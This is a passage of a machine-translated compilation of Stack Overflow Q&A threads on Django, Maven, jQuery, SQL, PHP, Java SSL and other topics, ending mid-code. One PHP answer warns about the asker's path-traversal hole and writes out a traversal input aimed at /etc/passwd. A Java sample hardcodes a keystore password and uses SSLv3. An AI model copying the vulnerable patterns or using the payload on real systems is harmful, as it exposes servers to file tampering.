自定义方法也可以是模型本身的属性。有关详细信息，请参阅[管理员文档](https://docs.djangoproject.com/en/dev/ref/contrib/admin/#django.contrib.admin.ModelAdmin.list_display)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T02:27:27.777

1.  **[制作一个自定义模板标签](https://docs.djangoproject.com/en/dev/howto/custom-template-tags/#writing-custom-template-tags)**，在更新信息亭时显示灯光

2.  **[覆盖管理基本模板](https://docs.djangoproject.com/en/dev/ref/contrib/admin/#overriding-admin-templates)**，即。复制`django/contrib/admin/templates/admin/base_site.html`到`your_project/templates/admin/base_site.html`

3.  **在您复制的管理基本模板中**添加您的模板标签****

 **这是一些工作，但希望您需要的所有内容都已记录在案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T02:06:50.157

自从我在 Django 工作以来已经有一段时间了，所以我无法帮助你编写代码。但是您的问题似乎在 Django 中应该很容易。

管理界面有点神奇，我认为你不应该尝试破解它来添加状态灯。（有可能自从我看了 Django 之后他们已经改变了一些东西，也许现在没那么神奇了？）

但是创建一个显示状态的新页面应该很容易，并使该页面仅对管理员可用。你可以获得一个自动刷新页面的 Firefox 或 Chrome 插件，这将导致 Django 重新运行查询并重新构建页面。然后，当您在管理界面中执行管理操作时，只需保持该页面打开并刷新即可。**

# wpf - DevExpress DataGrid 的 ColumnChooser

> ID：10989533
> 
> 赞同：0
> 
> 时间：2012-06-12T01:30:09.143
> 
> 标签：wpf, datagrid, devexpress, column-chooser

我使用 AutoPopulateColumns 系统在 DataGrid 上显示我的结构。是否有任何属性的属性可以在 ColumnChooser 窗口上显示属性，而不是在网格上？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-16T03:28:07.160

好的，我找不到这样的默认属性，所以我创建了自己的空属性，称之为“ShowInColumnChooserAttribute”。

使用此属性标记我在 dataGrid 上不需要但在 ColumnChooser 上需要的所有属性

在 dataGrid 的事件“ColumnsPopulated”中执行以下操作：

```
 var hiddenList = new List<string>();
        var r = dataTable.ItemsSource.GetType().GetGenericArguments()[0];
        foreach (var prop in r.GetProperties())
            if (prop.GetCustomAttributes(typeof(ShowInColumnChooserAttribute), true).Length > 0)
                hiddenList.Add(prop.Name);
        foreach (var column in ((DevExpress.Xpf.Grid.GridControl)sender).Columns)
                column.Visible = !hiddenList.Contains(column.FieldName); 
```

我认为这是非常简单和漂亮的解决方案！希望这会有所帮助！

# maven - maven 构建因 glassfish 依赖而失败

> ID：10989536
> 
> 赞同：-2
> 
> 时间：2012-06-12T01:30:22.893
> 
> 标签：maven, glassfish, dependency-management, pom.xml

我在 Maven 构建中始终收到以下错误。我无法弄清楚发生了什么。技术解释是什么？

```
Downloading: http://maven.glassfish.org/content/groups/glassfish/com/sun/jersey/jersey-project/1.2/jersey-project-1.2.pom
185b downloaded  (jersey-project-1.2.pom)
[WARNING] *** CHECKSUM FAILED - Checksum failed on download: local = '6c9fd3d150b8a5f0ca676f49b8ed603793cabebb'; remote = '<html>
<head><title>301' - RETRYING
Downloading: http://maven.glassfish.org/content/groups/glassfish/com/sun/jersey/jersey-project/1.2/jersey-project-1.2.pom
185b downloaded  (jersey-project-1.2.pom)
[WARNING] *** CHECKSUM FAILED - Checksum failed on download: local = '6c9fd3d150b8a5f0ca676f49b8ed603793cabebb'; remote = '<html>
<head><title>301' - IGNORING
[INFO] ------------------------------------------------------------------------
[ERROR] BUILD ERROR
[INFO] ------------------------------------------------------------------------
[INFO] Error building POM (may not be this project's POM).

Project ID: null:jersey-server:bundle:null

Reason: Cannot find parent: com.sun.jersey:jersey-project for project: null:jersey-server:bundle:null for project null:jersey-server:bundle:null

[INFO] ------------------------------------------------------------------------
[INFO] Trace
org.apache.maven.lifecycle.LifecycleExecutionException: Unable to get dependency information: Unable to read the metadata file for artifact 'com.sun.jersey:jersey-server:jar': Cannot find parent: com.sun.jersey:jersey-project for project: null:jersey-server:bundle:null for project null:jersey-server:bundle:null
  com.sun.jersey:jersey-server:jar:1.2 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-20T06:32:36.523

请检查本地存储库中的球衣项目 pom 文件
~/m2/repository/com/sun/jersey/jersey-project/1.2/jersey-project-1.2.pom C:\Users\.m2\repository\com\sun \jersey\jersey-project\1.2\jersey-project-1.2.pom

POM 内容可能不正确，如下所示，

```
<html>
<head><title>301 Moved Permanently</title></head>
<body bgcolor="white">
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/0.6.39</center>
</body>
</html 
```

只需删除 POM 文件（或仅删除 jersey 目录），然后重试，您将解决此问题

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T09:39:24.450

我也遇到了同样的问题，其实glassfish存储库一直是301。所以如果我们可以先使用中央存储库，就不会有这些问题。现在我的方法是修改使用 glassfish 存储库的 pom 文件。删除关于存储库的一些行。那么这次就可以工作了。但是很快又一个问题出现了，这么多 pom 包含 glassfish。我修改下一个。哦，太多了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-03-17T08:15:31.533

请参阅此答案 [https://stackoverflow.com/a/27248395/1122841](https://stackoverflow.com/a/27248395/1122841)

正如那里所建议的那样，我在 settings.xml （在 Maven 的配置目录内）中添加了镜像详细信息，删除了 .m2/repository/com/sun/jersey，以便删除以前下载的 jar 或 pom 并再次构建项目。它新成功地下载了所有东西。

# tomcat - 一旦tomcat停止或重新启动，如何确保发生某些事情

> ID：10989537
> 
> 赞同：1
> 
> 时间：2012-06-12T01:30:29.190
> 
> 标签：tomcat, jvm

有时，tomcat 重启会导致我的应用程序立即停止，以便我在 oracle db 中的消费数据保持一个错误状态。所以我想知道一旦tomcat停止，是否有任何方法可以帮助处理状态。由于未知，实际事件发生在tomcat的停止过程中。当tomcat停止时，我不知道如何确保发生某些事情。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:45:06.580

如果您正在进行正常重启，您应该能够注册一个shutdownhook并在服务器终止应用程序之前运行它。

查看 javadocs 了解更多详细信息：[http](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html#addShutdownHook(java.lang.Thread) ://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html#addShutdownHook(java.lang.Thread )。

您可以像这样添加关闭挂钩：

```
Runtime.getRuntime().addShutdownHook(new Thread(new Runnable(){
    public void run() {
         // clean-up logic
    }
})); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T01:54:33.960

也许您可以`LifecycleListener`为您的 tomcat 应用程序注册一个（[链接](http://tomcat.apache.org/tomcat-6.0-doc/config/context.html#Lifecycle_Listeners)）。一个生命周期监听器将在你的上下文被加载时和它被关闭之后被调用。

这是一个更复杂的解释[链接](http://docs.oracle.com/cd/B14099_19/web.1012/b14017/filters.htm#i1000654)。您可能想查看接口的`contextInitialized`和`contextDestroyed`方法`ServletContextListener`。

# python - Windows 进程不会通过套接字进行通信

> ID：10989542
> 
> 赞同：1
> 
> 时间：2012-06-12T01:31:55.617
> 
> 标签：python, windows, sockets, process, irc

我一直在编写一个 IRC 聊天机器人，它检查 Google Voice 是否有 SMS 消息，然后通过端口 6667 上的套接字将它们中继到聊天室。聊天消息处理在主子中运行，无限循环，而 GV 检查在一个单独的过程。实际的检查和获取工作正常，但它是套接字不起作用；没有消息发布到频道。奇怪的是，这在 OS X 下完美运行，所以我不认为问题出在语音处理逻辑上：

```
def checkVoice()
    while 1:
        print "Update voice!"
        #voice processing... edited for brevity
        sendPrivateMessage(CHANNEL,message) #This doesn't work
        #more code
        time.sleep(10)

#main block
if __name__ == '__main__':
    sendPrivateMessage(CHANNEL,"Voice checking started") #This works
    p = Process(target=checkVoice)
    p.start() 
```

我认为问题在于 Windows 使用 Python 的方式，因为它适用于其他平台。

聊天机器人的完整代码可以在这里看到： [bot.py](http://thebox.it.cx/exe/bot/bot.py)

如所问，这是`sendPrivateMessage`方法：

```
def sendPrivateMessage(channel, message):#private message send function
    global mute
    if mute == 0:
            IRC.send("PRIVMSG " + channel + " :" + message + "\r\n") 
```

# groovy - 仅在 if 语句中的变量不为空时测试

> ID：10989544
> 
> 赞同：17
> 
> 时间：2012-06-12T01:31:59.693
> 
> 标签：groovy, if-statement

我有以下方法，我只想在传入的情况下测试`event.status`属性：`status`

```
def findEvent(String desc, String status = null, Collection events) {
        return events.find {
            it.description == desc && \\If status is not null: it.status == status
        }

        throw new Exception("Review Event Record Not Found: ${desc}")
} 
```

我认为它可以这样做，但它似乎不起作用：

```
def findEvent(String desc, String status = null, Collection events) {
        return events.find {
            it.description == desc && (status != null ?: {it.status == status})
        }

        throw new Exception("Review Event Record Not Found: ${desc}")
} 
```

有什么办法可以做到吗？还是我必须回到这样的事情：

```
if (status != null) {
    return events.find {
        it.description == desc && it.status == status
    }
} else if (status == null) {
    return events.find {
        it.description == desc
    }
} 
```

有某种最佳实践吗？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-06-12T01:50:48.357

我不相信这个表达是有道理的。

猫王的意思是“如果真实，使用价值，否则使用其他东西。”

你的“其他东西”是一个闭包，价值是`status != null`，这两者似乎都不是你想要的。如果`status` *为*空，猫王说`true`。如果不是，您将获得额外的封闭层。

为什么你不能只使用：

```
(it.description == desc) && ((status == null) || (it.status == status)) 
```

即使这*不起作用*，您所需要的只是闭包以返回适当的值，对吗？无需创建两个单独`find`的调用，只需使用中间变量即可。

# jquery - .closest 在 jquery

> ID：10989546
> 
> 赞同：0
> 
> 时间：2012-06-12T01:32:02.167
> 
> 标签：jquery, html

我想从我的锚标签中定位最近的 div。所以为了做到这一点，我做了一个小功能，但它不起作用，我还希望一次显示一个 div 具有 id“信息”。

```
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<style type="text/css">

.frm { float:left; width:700px;}

.information { display:none}

</style>

<script type="text/javascript" src="jquery-1.7.2.js"></script>

<script type="text/javascript">

$(function (){

    $('.frm').find('a').each(function (){

        $(this).click(function (){

        $(this).closest('div').css ('display','block')

            }
        )

        })

    })

</script>

</head>

<body>

<div class="wrap">
<div class="frm">
<ul>

<li>heading</li>
<li>paragraph</li>
<li><a href="#">link</a></li>

</ul>

<div class="information">

<h6>jitender</h6>
<p>containg data</p>

</div>

</div>

<div class="frm">
<ul>

<li>heading</li>
<li>paragraph</li>
<li><a href="#">link</a></li>

</ul>

<div class="information">

<h6>jitender</h6>
<p>containg data</p>

</div>

</div>

</div>

</body> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:37:49.507

看到这个工作小提琴：http: [//jsfiddle.net/HackedByChinese/twzuq/](http://jsfiddle.net/HackedByChinese/twzuq/)

```
$('.frm a').click(function(e) {
   e.preventDefault();

   $('.information').hide(); // make sure all .information divs are hidden
   $(this).closest('ul').next('.information').show(); // show the .information div nearest the link
});​ 
```

正如评论中提到的，[`.closest`](http://api.jquery.com/closest/)遍历当前元素的祖先以找到与选择器匹配的元素。所以，在这里我找到了包含点击链接的 UL，然后我用它[`.next`](http://api.jquery.com/next/)来选择下一个具有`.information`该类的元素。

此外，`.show`分别`.hide`设置`display`=`none`和`block`（或者`inline`，如果元素是内联的）。使用的快捷方式`.css('display','none')`。

# python - 正则表达式在 Python 中不返回任何内容

> ID：10989550
> 
> 赞同：0
> 
> 时间：2012-06-12T01:34:05.030
> 
> 标签：python, beautifulsoup, mechanize

我第一次使用 Python，我使用 Mechanize 搜索网站以及 BeautifulSoup 来选择特定的 div，现在我正在尝试使用正则表达式获取特定的句子。这是汤对象的内容；

```
 <div id="results">
   <table cellspacing="0" width="100%">
     <tr>
       <th align="left" valign="middle" width="32%">Physician Name, (CPSO#)</th>
       <th align="left" valign="middle" width="36%">Primary Practice Location</th>
       <!-- <th width="16%" align="center" valign="middle">Accepting New Patients?</th> --> 
       <th align="center" valign="middle" width="32%">Disciplinary Info  &amp; Restrictions</th>
     </tr>

    <tr>
        <td>
            <a class="doctor" href="details.aspx?view=1&amp;id= 85956">Hull, Christopher Merritt </a> (#85956)
        </td>
        <td>Four Counties Medical Clinic<br/>1824 Concessions Dr<br/>Newbury ON  N0L 1Z0<br/>Phone: (519) 693-0350<br/>Fax: (519) 693-0083</td>
        <!-- <td></td> --> 
        <td align="center"></td>
    </tr>
  </table>
</div> 
```

（感谢您对格式化的帮助）

我得到文本“Hull, Christopher Merritt”的正则表达式是；

```
patFinderName = re.compile('<a class="doctor" href="details.aspx?view=1&amp;id= 85956">(.*) </a>') 
```

它一直空着，我不知道为什么，有人有什么想法吗？

谢谢大家的回答，我改成了；

```
patFinderName = re.compile('<a class="doctor" href=".*">(.*) </a>') 
```

现在它工作得很好。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T01:39:13.970

`?`是正则表达式中的一个魔术标记，表示前一个原子的零个或一个。当你想要一个文字问号符号时，你需要转义它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T01:39:36.953

你应该在你的正则表达式中转义`?`：

```
In [8]: re.findall('<a class="doctor" href="details.aspx\?view=1&amp;id= 85956">(.*)</a>', text)
Out[8]: ['Hull, Christopher Merritt '] 
```

# javascript - 旋转盖流效果

> ID：10989551
> 
> 赞同：2
> 
> 时间：2012-06-12T01:34:06.503
> 
> 标签：javascript, html, css

HTML：

```
- for (x in dict)
  div.test
    div.ContentFlow
      div.loadIndicator
        div.indicator
      div.flow
        - for (var i in dict[x])
          img(class='item', src='/images/' + dict[x][i] + '.jpg') 
```

我的CSS：

```
.test {
  display:block;
}
.ContentFlow {
  margin-top: 10%;
} 
```

客户端JS：

```
var count = 0
var items;
var amount = 0;
$(window).load(function(){
    items = $("#test .ContentFlow");
    amount = items.length;

    items.hide();
    items.eq(count).show();
}
$(window).load(setInterval(function(){

    // tried this as well
    //var items = $("#test .ContentFlow");
    //var amount = items.length;

    items.eq(count).hide();
    count >= amount-1 ? count = 0 : count++;
    items.eq(count).show();

}, 1000)); 
```

ConentFlow css/js： [http ://www.jacksasylum.eu/ContentFlow/docu.php](http://www.jacksasylum.eu/ContentFlow/docu.php)

我正在尝试每 5 秒旋转 .ContentFlow div。但是，它不起作用。为 ContentFlow 类设置 display:none 后，在加载时及之后不会显示任何内容。如果我没有在我的 css 中为 ContentFlow div 设置 display:none，所有 div 都会在加载时显示

我应该使用哪些属性让它工作。如果问题不清楚，请告诉我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:43:49.473

移动

```
items = $(".ContentFlow");
var amount = items.length; 
```

在函数内部，以便在窗口加载后执行。

* * *

重构：

```
var count = 0;

$(window).load(function(){

    // Hide at first
    $("#test .ContentFlow").hide();

    // Start repeating toggle
    setInterval(function(){

        var items = $("#test .ContentFlow");
        var amount = items.length;

        items.eq(count).hide();
        (count >= amount-1) ? count = 0 : count++;
        items.eq(count).show();

    }, 1000);
}; 
```

而不是使用 进行初始隐藏`$("#test .ContentFlow").hide();`，您可能只想设置一个样式`.ContentFlow{display:none;}`以避免在页面仍在加载时闪烁。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T08:20:50.457

我建议您使用最新版本的[**ContentFlow v1.0.2**](http://www.jacksasylum.eu/ContentFlow/index.php)，它允许多个 ContentFlow 在同一个网页上，每个都有唯一的 JavaScript 处理程序。

然后，您可以使用[**ContentFlow 幻灯片插件**](http://www.jacksasylum.eu/ContentFlow/addons.php#ContentFlow_slideshow)来处理您需要的所有时间要求。

Slideshow 插件的好处是可以将每个 ContentFlow 设置为不同的计时速度。

# sql - 替换数据库文本字段中所有出现的子字符串

> ID：10989552
> 
> 赞同：8
> 
> 时间：2012-06-12T01:34:17.230
> 
> 标签：sql, postgresql, replace

我有一个包含大约 10k 条记录的数据库，其中一些包含我想替换的 HTML 字符。

例如，我可以找到所有事件：

```
SELECT * FROM TABLE
WHERE TEXTFIELD LIKE '%&#47%' 
```

原始字符串示例：

`this is the cool mega string that contains &#47`

如何全部替换`&#47`为`/`？

最终结果应该是：

`this is the cool mega string that contains /`

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-06-12T02:07:14.667

如果您想用另一个字符串或该字符串的转换替换特定字符串，您可以使用 postgresql 中的“替换”函数。例如，要将“myfield”列中所有出现的“cat”替换为“dog”，您可以：

```
UPDATE tablename
SET myfield = replace(myfield,"cat", "dog") 
```

您可以添加 WHERE 子句或您认为合适的任何其他逻辑。

或者，如果您尝试转换 HTML 实体、ASCII 字符或在各种编码方案之间转换，postgre 也有相应的功能。 [Postgresql 字符串函数](http://www.postgresql.org/docs/9.1/static/functions-string.html)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-12T05:48:45.313

@davesnitty 给出的答案会起作用，但是您需要非常仔细地考虑您要替换的文本模式是否会嵌入到您不想修改的较长模式中。否则你会发现有人[在生火](http://www.dailymail.co.uk/sciencetech/article-2155955/Publisher-replaces-instances-Kindle-rival-e-book-reader-Nook--ends-destroying-War-Peace.html)，这很奇怪。

如果可能，请使用合适的专用工具来处理您要逃避的事情。有 URLEncoded 文本？使用 url 解码器。有 XML 实体吗？通过文本模式输出中的 XSLT 样式表处理它们。等等。对于您的数据而言，这些通常比使用查找和替换来破解它更安全，因为如果不小心应用，查找和替换通常会产生不幸的副作用，如上所述。

您可能[想要](http://xkcd.com/208/)使用[正则表达式](http://en.wikipedia.org/wiki/Regular_expression)。它们[不是所有问题的通用解决方案，](http://www.codinghorror.com/blog/2008/06/regular-expressions-now-you-have-two-problems.html)但对于某些工作来说确实很方便。

如果您想无条件地用“/”替换所有“/”实例，则不需要正则表达式。

如果您想替换“/”而不是“Ǘ”，则可能需要一个正则表达式，因为您可以执行诸如仅匹配整个单词、匹配各种模式、指定最小/最大数字运行等操作。

在[PostgreSQL 字符串函数和运算符](http://www.postgresql.org/docs/9.1/static/functions-string.html)文档中，您会找到该`regexp_replace`函数，它可以让您在语句期间应用正则表达式`UPDATE`。

为了能够说更多，我需要知道您的真实数据是什么以及您真正想要做什么。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-07-25T12:34:48.240

如果您没有 postgres，您可以将所有数据库导出到一个 sql 文件，用文本编辑器替换您的字符串并删除您主机上的数据库，然后重新导入您的新数据库

PS：小心

# haskell - 在另一个函数结果上反转函数？

> ID：10989554
> 
> 赞同：0
> 
> 时间：2012-06-12T01:34:20.273
> 
> 标签：haskell

是否可以在用户定义的函数上使用反向函数？

所以 usermade 函数给你一个结果，然后我想反转那个结果。

```
mult_add d s = d + 10*s

form_number_back d = foldr mult_add 0 d 
```

反转上述结果的函数

```
form_number_front d = reverse [d form_number_back] 
```

我正在用 form_number_back 反转一个列表...然后用 form_number_front 反转它。

我也试过 foldl 没有结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T08:53:18.523

```
form_number_front d = reverse [d form_number_back] 
```

这有很多问题。

首先，`form_number_back`是一个函数，并且`d`是您希望传递给该函数的数字。该函数必须出现在其参数的左侧：

```
form_number_front d = reverse [form_number_back d] 
```

更实质的`reverse`是，用于反转*列表*。但是调用的结果`form_number_back`是一个*数字*；您似乎想要反转该号码中的数字。

现在，您可以尝试在将列表转换为数字*之前* `form_number_back`将其反转：

```
form_number_front d = form_number_back (reverse d) 
```

您可以尝试重写`form_number_back`以按照您想要的顺序折叠列表：

```
form_number_front d = foldl (flip mult_add) 0 d 
```

这有帮助吗？

# ios - 如何检查 Xcode 项目源代码的圈复杂度？

> ID：10989556
> 
> 赞同：0
> 
> 时间：2012-06-12T01:34:39.943
> 
> 标签：ios, objective-c, xcode, cyclomatic-complexity

我需要分析一个大型 Xcode 项目的[圈复杂度](http://en.wikipedia.org/wiki/Cyclomatic_complexity)。

有没有人有一种简单的方法来检查 Xcode 项目中包含的代码的圈复杂度？

是否有设置用于读取 xcode 项目的工具？我似乎找不到一个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T04:29:23.047

经过一番搜索，我发现[这个 python 脚本项目](http://code.google.com/p/headerfile-free-cyclomatic-complexity-analyzer/) 是最有用的。

它适用于 XCode 项目，因为它忽略标头和#imports/includes - 这是使用 XCode 的其他静态分析工具的主要问题 - 您必须对其进行配置以找到 SDK 等。

希望这对像我一样正在寻找 CC 工具的其他人有所帮助。

干杯:)

# css - 如何将此CSS转换为更少

> ID：10989559
> 
> 赞同：0
> 
> 时间：2012-06-12T01:36:06.277
> 
> 标签：css, less

您将使用什么方法将以下 css 转换为更干的代码：

```
nav ul,
nav ol,
ul.reset,
ol.reset {
    list-style: none;
    margin: 0;
    padding: 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:41:15.643

绝对没有。CSS/LESS 很棒，没有更好/更干的方式来用 LESS 编写它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T18:16:51.163

这是我能想到的最好的：

```
.resetList() {
    list-style: none;
    margin: 0;
    padding: 0;
}
nav {
    ul, ol {
        .resetList;
    }
}
ul, ol {
    &.reset {
        .resetList;
    }
} 
```

然而，由于 mixins 的工作方式，上面会编译成这样：

```
nav ul,
nav ol {
  list-style: none;
  margin: 0;
  padding: 0;
}
ul.reset,
ol.reset {
  list-style: none;
  margin: 0;
  padding: 0;
} 
```

所以我同意[@ascii-lime](https://stackoverflow.com/a/10989589/552067)的观点，即纯 CSS 可能是这种简单事情的更好途径。希望少将在未来提供替代方案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T04:52:53.483

如果您想将其转换为`LESS`. 通过使用 LESS 技术，代码将变得更长。最好保持原样。

如果你仍然想这样做，你可以试试这个：

```
nav {

    list-style: none;
    margin: 0;
    padding: 0;

    ul, ol {

        list-style: none;
        margin: 0;
        padding: 0;

        &.reset {

            list-style: none;
            margin: 0;
            padding: 0;

        }

    }

} 
```

# mysql - MySQL Case 语句（如果等效，则为 else）

> ID：10989567
> 
> 赞同：3
> 
> 时间：2012-06-12T01:37:24.487
> 
> 标签：mysql, position, case

我试图通过提交下拉框（其名称分配给 PHP 变量 $position）更新一个项目的位置后，根据他们的位置重新排序列表。这是一个示例，位置由它们在列表中的顺序表示：

1.  项目1
2.  项目2
3.  第 3 项
4.  项目4
5.  项目5

我正在使用以下 MySQL 查询：

```
UPDATE subjects SET 
position = position + 1 
WHERE position <= position AND position >= {$position}; 
```

如果我要将 Item5 移动到位置 2，则此查询会将位置 2 到 4 的所有内容向下推一个位置，从而导致：

1.  项目1
2.  第5项<<<*向上移动*
3.  项目2
4.  第 3 项
5.  项目4

但是，如果我希望做相反的事情并向下移动一个项目，则位置需要减少一个（位置 = 位置 - 1），并且 <= 和 >= 符号将交换。因此，我想知道如何在 case 参数中执行此操作（相当于 if{} else if{}）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T01:48:40.843

如果您需要 if else 您可以使用 MySQL`case`语句（[链接](http://dev.mysql.com/doc/refman/5.0/en/case-statement.html)）。它基本上工作如下：

```
CASE case_value
  WHEN when_value THEN statement_list
  [WHEN when_value THEN statement_list] ...
  [ELSE statement_list]
END CASE 
```

您可以根据需要嵌套它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T01:49:38.720

请尝试一下

```
update subjects set position=(CASE
    WHEN search_condition THEN 
        position+1
    WHEN search_condition THEN 
    postion-1
    else
       postion
END CASE) WHERE position <= position AND position >= {$position} AND menu_type = '{$menu_type}'"; 
```

# php - 如何在从 php 表单保存的文件中包含自定义文本？

> ID：10989569
> 
> 赞同：0
> 
> 时间：2012-06-12T01:37:40.033
> 
> 标签：php, html

我正在使用下面的代码，它只是获取通过表单提交的艺术家的姓名并将其保存为服务器上的 html 文件。

```
<?php

if (isset($_GET['artist'])) {
$fileName = $_GET['artist'].".html";
$fileHandler = fopen($fileName, 'w') or die("can't create file");
fclose($fileHandler);
}
?> 
```

我要解决的是如何在文件保存之前在文件中添加任何代码。这样每次用户添加艺术家时，我都可以在文件中包含我的模板代码。任何帮助都会很棒:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:42:07.190

使用`fwrite`.

两件事情：

1.  `file_put_contents`整体会更快。
2.  你的设计是一个**非常糟糕的主意**。他们可以在文件系统的任何位置注入文件，例如`artist=../../../../etc/passwd%00`尝试写入`/etc/passwd`（%00 是 NUL 字节，这会导致 fopen 终止 C 中的字符串 - 除非已修复）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T01:46:12.300

警告 - 非常小心你写入文件系统的内容。在您的示例中，没有什么可以阻止某人写入您从未预料到的文件系统部分（例如，artist='../index'！）。

我真诚地建议您三思而后行，或者将内容保存到数据库中（使用适当的最佳实践，即[http://php.net/manual/en/security.database.sql-injection.php](http://php.net/manual/en/security.database.sql-injection.php)）或至少使确保限制文件名字符串中使用的字符（例如，仅允许字符 AZ 或 az 和“_”）。否则它是危险的和可利用的，至少你冒着你的网站被污损或滥用的风险。

正如其他人所说 - 您应该能够使用 fwrite 将 php 代码写入文件系统。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T01:41:39.933

[`fwrite()`](http://php.net/manual/en/function.fwrite.php)允许您将文本写入文件。

```
if (isset($_GET['artist'])) {
  $fileName = $_GET['artist'].".html";
  $fileHandler = fopen($fileName, 'w') or die("can't create file");
  fwrite($fileHandler, 'your content goes here');
  fclose($fileHandler);
} 
```

# php - PHP数组与数据库的性能

> ID：10989572
> 
> 赞同：1
> 
> 时间：2012-06-12T01:37:56.253
> 
> 标签：php, database, arrays, performance

我有一个 PHP 文件，其中包含一个大数组（大约 90KB）。我正在考虑将其移至数据库，但我不确定这是否值得。

一般来说，我可能会遇到 90KB 数组的问题吗？通过将数据移动到数据库，我会获得任何速度提升吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T01:39:09.840

数组比访问数据库要快得多*。*访问数据库是您在 PHP 中可以做的更昂贵的事情之一，而访问数组是最快的事情之一。

# java - Java Simpleframework 和 SSL

> ID：10989574
> 
> 赞同：4
> 
> 时间：2012-06-12T01:38:42.220
> 
> 标签：java, curl, ssl, https, simple-framework

当我运行下面的代码时，我可以通过浏览器正常访问它，但我似乎无法使用 curl 和以下命令让它工作：

```
curl -v -s -k "https://localhost:8080" 
```

我正在运行以下代码：

```
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.net.InetSocketAddress;
import java.net.SocketAddress;
import java.security.KeyStore;

import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;

import org.simpleframework.http.Request;
import org.simpleframework.http.Response;
import org.simpleframework.http.core.Container;
import org.simpleframework.transport.connect.Connection;
import org.simpleframework.transport.connect.SocketConnection;

/**
 * Simple Server SSL Hello World Example.
 *  
 */
public class SimpleSSLHelloWorld implements Container {

    public static int count = 0;

    public static String EMTPY_STRING = "";

    public static int serverPort;

    public static String KEYSTORE_PROPERTY = "javax.net.ssl.keyStore";

    public static String KEYSTORE_PASSWORD_PROPERTY = "javax.net.ssl.keyStorePassword";

    public static String KEYSTORE_TYPE_PROPERTY = "javax.net.ssl.keyStoreType";

    public static String KEYSTORE_ALIAS_PROPERTY = "javax.net.ssl.keyStoreAlias";

    public static void main(final String[] args) throws Exception {

        SimpleSSLHelloWorld.serverPort = 8080;
        // System.setProperty("javax.net.debug", "all");
        System.setProperty(SimpleSSLHelloWorld.KEYSTORE_PROPERTY, "mySrvKeystore");
        System.setProperty(SimpleSSLHelloWorld.KEYSTORE_PASSWORD_PROPERTY, "123456");

        Container container = new SimpleSSLHelloWorld();
        SocketAddress address = new InetSocketAddress(SimpleSSLHelloWorld.serverPort);

        SSLContext sslContext = SimpleSSLHelloWorld.createSSLContext();

        Connection connectionHttps = new SocketConnection(container);
        connectionHttps.connect(address, sslContext);

        System.out.println("Simple Server started on port: " + SimpleSSLHelloWorld.serverPort);
    }

    public void handle(final Request request, final Response response) {
        try {
            System.out.println("what");
            SimpleSSLHelloWorld.logRequest(request);

            SimpleSSLHelloWorld.dummyResponse(response);

            SimpleSSLHelloWorld.logResponse(response);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static SSLContext createSSLContext() throws Exception {

        String keyStoreFile = System.getProperty(SimpleSSLHelloWorld.KEYSTORE_PROPERTY);
        String keyStorePassword = System.getProperty(SimpleSSLHelloWorld.KEYSTORE_PASSWORD_PROPERTY,
                SimpleSSLHelloWorld.EMTPY_STRING);
        String keyStoreType = System.getProperty(SimpleSSLHelloWorld.KEYSTORE_TYPE_PROPERTY, KeyStore.getDefaultType());

        KeyStore keyStore = SimpleSSLHelloWorld.loadKeyStore(keyStoreFile, keyStorePassword, null);
        FileInputStream keyStoreFileInpuStream = null;
        try {
            if (keyStoreFile != null) {
                keyStoreFileInpuStream = new FileInputStream(keyStoreFile);

                keyStore = KeyStore.getInstance(keyStoreType);
                keyStore.load(keyStoreFileInpuStream, keyStorePassword.toCharArray());
            }
        } finally {
            if (keyStoreFileInpuStream != null) {
                keyStoreFileInpuStream.close();
            }
        }

        KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
        keyManagerFactory.init(keyStore, keyStorePassword.toCharArray());

        SSLContext sslContext = SSLContext.getInstance("SSLv3");
        // sslContext.init(keyManagerFactory.getKeyManagers(), new TrustManager[]{new NaiveX509TrustManager()}, null);
        sslContext.init(keyManagerFactory.getKeyManagers(), null, null);

        return sslContext;
    }

    public static KeyStore loadKeyStore(final String keyStoreFilePath, final String keyStorePassword,
            final String keyStoreType) throws Exception {
        KeyStore keyStore = null;
        File keyStoreFile = new File(keyStoreFilePath);

        if (keyStoreFile.isFile()) {
            keyStore = KeyStore.getInstance(keyStoreType != null ? keyStoreType : KeyStore.getDefaultType());
